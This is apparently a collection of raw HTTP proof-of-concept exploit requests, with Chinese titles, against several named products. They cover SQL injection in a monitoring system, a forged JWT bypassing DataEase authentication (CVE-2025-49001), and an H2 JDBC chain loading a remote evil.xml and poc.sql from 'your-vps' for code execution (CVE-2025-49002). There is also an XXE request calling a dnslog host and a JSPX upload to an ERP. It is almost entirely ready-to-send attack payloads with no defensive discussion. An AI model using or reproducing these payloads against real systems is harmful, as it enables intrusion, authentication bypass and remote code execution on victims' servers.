User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
If-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMT
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryITdrx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
Cache-Name: 5bCP6Im+
Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc


------WebKitFormBoundaryITdrxxca8L1Xo7Rq
Content-Disposition: form-data; name="operation"

test
------WebKitFormBoundaryITdrxxca8L1Xo7Rq
Content-Disposition: form-data; name="plaintext"

马子
------WebKitFormBoundaryITdrxxca8L1Xo7Rq
Content-Disposition: form-data; name="id"

2
------WebKitFormBoundaryITdrxxca8L1Xo7Rq
Content-Disposition: form-data; name="x"; filename="x"

1
------WebKitFormBoundaryITdrxxca8L1Xo7Rq--



华测监测预警系统 sysGroupEdit.aspx SQL注入
GET /Web/SysManage/sysGroupEdit.aspx?id=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2889%29%2BCHAR%28118%29%2BCHAR%2889%29%2BCHAR%2888%29%2BCHAR%28105%29%2BCHAR%28119%29%2BCHAR%2898%29%2BCHAR%28110%29%2BCHAR%2867%29%2BCHAR%28114%29%2BCHAR%28113%29%2BCHAR%2877%29%2BCHAR%2886%29%2BCHAR%2869%29%2BCHAR%28118%29%2BCHAR%2885%29%2BCHAR%28120%29%2BCHAR%28104%29%2BCHAR%28111%29%2BCHAR%2866%29%2BCHAR%2899%29%2BCHAR%2868%29%2BCHAR%2897%29%2BCHAR%2869%29%2BCHAR%28117%29%2BCHAR%2875%29%2BCHAR%2876%29%2BCHAR%28115%29%2BCHAR%2874%29%2BCHAR%2866%29%2BCHAR%2873%29%2BCHAR%2888%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%2877%29%2BCHAR%2876%29%2BCHAR%2880%29%2BCHAR%2898%29%2BCHAR%28119%29%2BCHAR%2889%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28113%29--+wkZw

Dataease JWT 认证绕过漏洞(CVE-2025-49001)
GET /de2api/user/info HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Host: xx.x.xx.xx
out_auth_platform: default
X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8￼

Dataease H2数据库远程代码执行漏洞(CVE-2025-49002)
evil.xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

    <!-- 使用DNSLog外带信息 -->
    <bean class="java.net.InetAddress" factory-method="getByName">
            <constructor-arg value="http://dnslog"/>
    </bean>
</beans>

poc.sql
CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)';
CREATE ALIAS NEW_INSTANCE FOR 'org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])';
CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';

SET @url_str='http://your-vps/evil.xml';
SET @url_obj=UNESCAPE_VALUE(@url_str);
SET @context_clazz=CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext');
SET @string_clazz=CLASS_FOR_NAME('java.lang.String');

CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], ARRAY[@url_obj]);

POST /de2api/datasource/validate HTTP/1.1
Host: your-ip
Accept-Encoding: gzip, deflate, br, zstd
sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8
Accept-Language: zh-CN
Sec-Fetch-Dest: empty
sec-ch-ua-mobile: ?0
Sec-Fetch-Site: same-origin
sec-ch-ua-platform: "Windows"
Content-Type: application/json
Sec-Fetch-Mode: cors
Content-Length: 821

{
    "id": "",
    "name": "11",
    "description": "",
    "type": "h2",
    "apiConfiguration": [],
    "paramsConfiguration": [],
    "enableDataFill": false,
    "configuration": "eyJkYXRhQmFzZSI6IiIsImpkYmMiOiJqZGJjOmgyOm1lbTp0ZXN0ZGI7VFJBQ0VfTEVWRUxfU1lTVEVNX09VVD0zO2luaXQ9UlVuU0NSSVBUIEZST00gJ2h0dHA6Ly95b3VyLXZwczoyMzMzL3BvYy5zcWwnIiwidXJsVHlwZSI6ImpkYmNVcmwiLCJzc2hUeXBlIjoicGFzc3dvcmQiLCJleHRyYVBhcmFtcyI6IiIsInVzZXJuYW1lIjoiMTIzIiwicGFzc3dvcmQiOiIxMjMiLCJob3N0IjoiIiwiYXV0aE1ldGhvZCI6IiIsInBvcnQiOjAsImluaXRpYWxQb29sU2l6ZSI6NSwibWluUG9vbFNpemUiOjUsIm1heFBvb2xTaXplIjo1LCJxdWVyeVRpbWVvdXQiOjMwfQ=="
}

金和OA-C6系统ActionDataSet接口XXE漏洞
POST /jc6/servlet/ActionDataSet HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Content-Type: application/xml
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://323232323.xxxx.dnslog.cn"> %remote;]>

北京时空智友ERP系统 updater.uploadStudioFile 文件上传漏洞
POST /formservice?service=updater.uploadStudioFile HTTP/1.1
Host: xxxx.com
Content-Type: application/x-www-form-urlencoded

content=<updater xmlns:jsp="http://java.sun.com/JSP/Page"><filename>test.jspx</filename><filepath>../../../images/</filepath><filesize>347</filesize><lmtime>{{time()}}</lmtime><jsp:scriptlet>out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();</jsp:scriptlet></updater>
